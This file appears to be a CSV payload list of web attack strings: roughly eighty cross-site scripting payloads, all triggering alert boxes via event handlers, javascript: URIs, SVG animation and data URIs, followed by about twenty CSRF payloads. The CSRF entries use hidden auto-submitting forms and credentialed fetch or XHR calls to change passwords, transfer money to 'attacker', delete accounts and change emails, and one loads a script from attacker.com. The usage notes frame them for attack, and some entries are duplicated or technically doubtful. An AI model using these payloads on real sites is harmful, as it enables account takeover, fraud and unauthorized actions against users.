id,description,payload,context,type,severity,example_query,example_usage
xss-020,Reflected XSS with math tag and href attribute,"<math href='javascript:alert(""XSS20"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,Reflected XSS with base tag and href attribute,"<base href=""javascript:alert('XSS21');//"">",URL parameter,reflected,high,,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,Stored XSS with anchor tag and onclick event,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",User input field,stored,high,,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,Reflected XSS with meta tag and content attribute,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,Stored XSS with button tag and onclick event,"<button onclick='alert(""XSS24"")'>Click</button>",User input field,stored,high,,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,Reflected XSS with form tag and onreset event,<form onreset=alert('XSS25')><input type='reset'></form>,URL parameter,reflected,high,,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,Stored XSS with marquee tag and onstart event,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,User input field,stored,high,,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,Reflected XSS with embed tag and src attribute,"<embed src='javascript:alert(""XSS27"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,Stored XSS with bgsound tag and src attribute,"<bgsound src='javascript:alert(""XSS28"")'>",User input field,stored,high,,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,Reflected XSS with xml tag and onload event,<xml onload=alert('XSS29')>,URL parameter,reflected,high,,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-031,Reflected XSS using SVG with animate element and begin attribute,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,Stored XSS using JavaScript URI in base tag,"<base href=""javascript:alert('XSS32');//"">",User profile input,stored,high,,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,Reflected XSS using malformed iframe with srcdoc and encoded script,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,URL parameter,reflected,high,,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,Stored XSS using onpointerover event in div,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",User input field,stored,high,,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,Reflected XSS using malformed script tag with backticks,<script>alert(XSS35)</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,Stored XSS using SVG foreignObject with embedded HTML and script,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,User input field,stored,high,,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,Reflected XSS using onanimationstart event in div,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",URL parameter,reflected,high,,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,Stored XSS using input tag with oninput event,"<input oninput='alert(""XSS38"")'>",User input field,stored,high,,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,Reflected XSS using malformed script with template literals,<script>eval(alert('XSS39'))</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,Stored XSS using object tag with data URI,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",User input field,stored,high,,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,Reflected XSS using onpointerdown event in span,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",URL parameter,reflected,high,,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,Stored XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS42"")'>X</math>",User input field,stored,high,,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,Reflected XSS using iframe with sandbox attribute bypass,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,Stored XSS using video tag with oncanplay event,"<video oncanplay='alert(""XSS44"")'></video>",User input field,stored,high,,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,Reflected XSS using meta tag with refresh and encoded javascript URI,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,Stored XSS using svg with set attribute and onbegin event,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,Reflected XSS using malformed script with setTimeout,"<script>setTimeout('alert(""XSS47"")',0)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,Stored XSS using details tag with ontoggle event,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,Reflected XSS using input tag with formaction attribute,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",URL parameter,reflected,high,,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,Reflected XSS using script tag with setInterval,"<script>setInterval(function(){alert('XSS51')},1000)</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,Stored XSS using iframe with onload and srcdoc,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",User input field,stored,high,,"User input: <iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,Reflected XSS using svg with onload and script tag,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,Stored XSS using iframe with src set to javascript URI,"<iframe src='javascript:alert(""XSS54"")'></iframe>",User input field,stored,high,,"User input: <iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,Reflected XSS using object tag with type attribute and data URI,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",URL parameter,reflected,high,,"http://example.com/page?param=<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,Stored XSS using svg with onload and setTimeout,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",User input field,stored,high,,"User input: <svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,Reflected XSS using iframe with srcdoc and encoded script,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,Stored XSS using svg with animateTransform and onbegin event,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,Reflected XSS using script tag with Function constructor,"<script>Function('alert(""XSS59"")')()</script>",URL parameter,reflected,high,,"http://example.com/page?param=<script>Function('alert(""XSS59"")')()</script>"
xss-061,Reflected XSS using SVG with feImage and onload event,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,Stored XSS using details tag with ontoggle event and script,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",User input field,stored,high,,"User input: <details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,Reflected XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS63"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,Stored XSS using audio tag with onerror event,"<audio src='x' onerror='alert(""XSS64"")'></audio>",User input field,stored,high,,"User input: <audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,Reflected XSS using iframe with srcdoc and onload event,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",User input field,stored,high,,"User input: <svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,Reflected XSS using input tag with oninvalid event,"<input oninvalid='alert(""XSS67"")' required>",URL parameter,reflected,high,,"http://example.com/page?param=<input oninvalid='alert(""XSS67"")' required>"
xss-068,Stored XSS using iframe with allow attribute and srcdoc,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",User input field,stored,high,,"User input: <iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,Reflected XSS using svg with onfocusin event,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,Stored XSS using video tag with onpause event,"<video onpause='alert(""XSS70"")'></video>",User input field,stored,high,,"User input: <video onpause='alert(""XSS70"")'></video>"
xss-071,Reflected XSS using svg with onmouseenter event,"<svg onmouseenter='alert(""XSS71"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,Stored XSS using form tag with oninput event,"<form oninput='alert(""XSS72"")'><input></form>",User input field,stored,high,,"User input: <form oninput='alert(""XSS72"")'><input></form>"
xss-073,Reflected XSS using svg with onwheel event,"<svg onwheel='alert(""XSS73"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,Stored XSS using iframe with allowfullscreen attribute and onload event,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",User input field,stored,high,,"User input: <iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,Reflected XSS using svg with onanimationend event,"<svg onanimationend='alert(""XSS75"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,Stored XSS using audio tag with onplay event,"<audio onplay='alert(""XSS76"")'></audio>",User input field,stored,high,,"User input: <audio onplay='alert(""XSS76"")'></audio>"
xss-077,Reflected XSS using svg with onscroll event,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,Stored XSS using iframe with seamless attribute and onload event,"<iframe seamless onload='alert(""XSS78"")'></iframe>",User input field,stored,high,,"User input: <iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,Reflected XSS using svg with oncut event,"<svg oncut='alert(""XSS79"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg oncut='alert(""XSS79"")'></svg>"
xss-080,Stored XSS using svg with oncopy event,"<svg oncopy='alert(""XSS80"")'></svg>",User input field,stored,high,,"User input: <svg oncopy='alert(""XSS80"")'></svg>"
xss-081,Reflected XSS using svg with onpaste event,"<svg onpaste='alert(""XSS81"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,Stored XSS using svg with onreset event,"<svg onreset='alert(""XSS82"")'></svg>",User input field,stored,high,,"User input: <svg onreset='alert(""XSS82"")'></svg>"
xss-083,Reflected XSS using svg with onsearch event,"<svg onsearch='alert(""XSS83"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,Stored XSS using svg with onselect event,"<svg onselect='alert(""XSS84"")'></svg>",User input field,stored,high,,"User input: <svg onselect='alert(""XSS84"")'></svg>"
xss-085,Reflected XSS using svg with onshow event,"<svg onshow='alert(""XSS85"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onshow='alert(""XSS85"")'></svg>"
xss-086,Stored XSS using svg with ontoggle event,"<svg ontoggle='alert(""XSS86"")'></svg>",User input field,stored,high,,"User input: <svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,Reflected XSS using svg with ontransitionend event,"<svg ontransitionend='alert(""XSS87"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,Stored XSS using svg with onunload event,"<svg onunload='alert(""XSS88"")'></svg>",User input field,stored,high,,"User input: <svg onunload='alert(""XSS88"")'></svg>"
xss-089,Reflected XSS using svg with onvolumechange event,"<svg onvolumechange='alert(""XSS89"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,Stored XSS using svg with onwaiting event,"<svg onwaiting='alert(""XSS90"")'></svg>",User input field,stored,high,,"User input: <svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,Reflected XSS using svg with onwheel event and CSS animation,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,Stored XSS using svg with onpointercancel event,"<svg onpointercancel='alert(""XSS92"")'></svg>",User input field,stored,high,,"User input: <svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,Reflected XSS using svg with onpointerout event,"<svg onpointerout='alert(""XSS93"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,Stored XSS using svg with onpointerover event,"<svg onpointerover='alert(""XSS94"")'></svg>",User input field,stored,high,,"User input: <svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,Reflected XSS using svg with onpointerup event,"<svg onpointerup='alert(""XSS95"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,Stored XSS using svg with onselectstart event,"<svg onselectstart='alert(""XSS96"")'></svg>",User input field,stored,high,,"User input: <svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,Reflected XSS using svg with onshow event and tabindex,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,Stored XSS using svg with onstalled event,"<svg onstalled='alert(""XSS98"")'></svg>",User input field,stored,high,,"User input: <svg onstalled='alert(""XSS98"")'></svg>"
xss-099,Reflected XSS using svg with onsubmit event,"<svg onsubmit='alert(""XSS99"")'></svg>",URL parameter,reflected,high,,"http://example.com/page?param=<svg onsubmit='alert(""XSS99"")'></svg>"
csrf-001,CSRF using auto-submitting hidden form with POST method,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,high,,Embed this form in a malicious page to auto-submit password change.
csrf-002,CSRF using image tag with GET request,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,Malicious webpage,CSRF,medium,,Trigger account deletion via GET request.
csrf-003,CSRF using XMLHttpRequest with credentials,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",Malicious webpage,CSRF,high,,Perform unauthorized money transfer.
csrf-004,CSRF using fetch API with credentials,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",Malicious webpage,CSRF,high,,Change victim's email address.
csrf-005,CSRF using auto-submitting form with file upload,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,CSRF,medium,,Upload malicious avatar file.
csrf-006,CSRF using meta refresh redirect with GET request,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,Malicious webpage,CSRF,medium,,Subscribe victim to premium plan.
csrf-007,CSRF using script tag to load external script triggering action,<script src='https://attacker.com/csrf-trigger.js'></script>,Malicious webpage,CSRF,high,,Load external script that performs CSRF.
csrf-008,CSRF using iframe with auto-submitting form inside,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,CSRF,high,,Change user settings silently.
csrf-009,CSRF using SVG with embedded script and form submission,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,CSRF,high,,Trigger delete API call.
csrf-010,CSRF using beacon API to send POST request,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",Malicious webpage,CSRF,medium,,Send data to target endpoint.
csrf-011,CSRF using form with onsubmit event to modify data,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,CSRF,high,,Modify data before submission.
csrf-012,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",Malicious webpage,CSRF,high,,Like a post on victim's behalf.
csrf-013,CSRF using form with hidden inputs and auto-submit,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Transfer money silently.
csrf-014,CSRF using fetch with POST and custom headers,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",Malicious webpage,CSRF,high,,Attempt to bypass CSRF token.
csrf-015,CSRF using form with enctype multipart/form-data,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Upload file without user consent.
csrf-016,CSRF using script with setTimeout to delay request,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",Malicious webpage,CSRF,high,,Delayed delete request.
csrf-017,CSRF using form with target iframe to hide submission,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Change settings silently.
csrf-018,CSRF using form with GET method and auto-submit,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,medium,,Send friend request without user consent.
csrf-019,CSRF using meta refresh with POST form submission via JavaScript,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,CSRF,high,,Subscribe victim to premium plan.
csrf-021,CSRF using stealth iframe with delayed form submission,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>",Malicious webpage,CSRF,high,,
